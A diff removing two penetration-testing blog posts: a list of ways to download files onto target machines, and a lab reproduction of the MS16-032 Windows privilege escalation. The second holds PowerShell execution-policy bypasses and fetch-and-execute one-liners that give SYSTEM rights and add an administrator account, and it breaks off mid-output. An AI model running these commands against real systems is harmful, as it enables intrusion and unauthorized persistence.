@@ -909,279 +909,6 @@
 
 
   
-    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
-<p>如果Powershell禁止执行了，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
-<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
-<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
-<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
-<p>复制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
-<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
-<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
-<p>target执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
-<p><strong>Netcat补充</strong>：</p>
-<p><code>传输文件</code></p>
-<p>方法一：</p>
-<p>接收端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p>传送端，发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
-<p>发送端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>接收端，连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p><code>传送目录</code></p>
-<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
-<p>接收端，先监听并准备解压缩</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
-<p>发送端，压缩并发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
-<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
-<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
-<li><ol>
-<li>打开记事本</li>
-</ol>
-</li>
-<li><ol>
-<li>文件，打开</li>
-</ol>
-</li>
-<li><ol>
-<li>在文件名处填入下载地址</li>
-</ol>
-</li>
-</ul>
-<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-MS16-032（CVE-2016-0099）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞类型：特权提升</p>
-<p>Microsoft 安全公告：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032</a></p>
-<p>exploit-db的详情：<a href="https://www.exploit-db.com/exploits/39574/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39574/</a></p>
-<p>利用时需要满足的要求</p>
-<blockquote>
-<p>①系统需要拥有至少2个的CPU核心</p>
-<p>②Power shell v2.0以及更高的版本</p>
-</blockquote>
-<p>影响的Windwos版本</p>
-<blockquote>
-<p>Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10</p>
-</blockquote>
-<p>本次复现的版本为Windows 7，其他的没有再去复现</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
-<p>测试机：Windows 7</p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>测试一：普通用户登录下，获取管理员cmd</p>
-<p>脚本地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1" target="_blank" rel="noopener">1_Invoke-MS16-032.ps1</a></p>
-<p>创建文件的方法有多种，这里演示两种：</p>
-<p>①创建文件<code>1_Invoke-MS16-032.ps1</code>并写入内容；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1	#写入内容</span><br></pre></td></tr></table></figure>
-<p>②用之前提到的powershell脚本直接下载文件</p>
-<p>Ps：可以参考我之前转载的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/10/04/%E5%8D%81%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">十三种方式下载文件</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;type download.ps1</span><br><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\MS16-032\1_Invoke-MS16-032.ps1&quot;)</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;dir</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          .</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/04  03:08               184 download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\download.ps1</span><br><span class="line">PS E:\MS16-032&gt; dir</span><br><span class="line">Mode                LastWriteTime     Length Name</span><br><span class="line">----                -------------     ------ ----</span><br><span class="line">-a---         2019/10/4      3:08      11460 1_Invoke-MS16-032.ps1</span><br><span class="line">-a---         2019/10/4      3:08        184 download.ps1</span><br></pre></td></tr></table></figure>
-<p>文件下载好之后，先展示一下当前用户，以及属组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user  test</span><br><span class="line">用户名                 test</span><br><span class="line">...</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>无权的一个用户，现在开始执行脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; Invoke-MS16-032</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>执行完之后，直接拿到管理员的cmd</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/ms16_032-1.png" alt="1-1"></p>
-<p>前面的步骤时进入powershell在执行命令，但其实可以加一个<code>-c</code>参数，后面可以直接接命令，分号分隔开，然后就会自动执行，不用进入powershell。当然，这是根据个人喜好，进入powershell之后还有tab自动补全等功能</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass -c &quot;. .\1_Invoke-MS16-032.ps1;Invoke-MS16-032&quot;</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>测试二：普通用户登录下，创建其他用户，并加入<code>administrators</code>组</p>
-<p>脚本地址：<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">2_Invoke-MS16-032.ps1</a></p>
-<p>Ps：相对于测试一的脚本，该脚本进行了简单改变，可以执行任意程序，并可以添加参数执行（全程无弹框）。<code>-Application</code>参数可以执行任意程序</p>
-<p>先看一下权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
-<p>在这里又学了一招，不用下载文件，直接远程利用脚本，不用下载到本地（当然也可以像之前那样）。现在开始执行脚本，直接试一下添加用户：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test                     test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>可以看到<code>test_test</code>用户添加完成，但是只属于<code>Users组</code>，现在将其加入<code>Administrators组</code>，先查看一下组和权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
-<p>然后执行脚本并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net localgroup Administrators test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             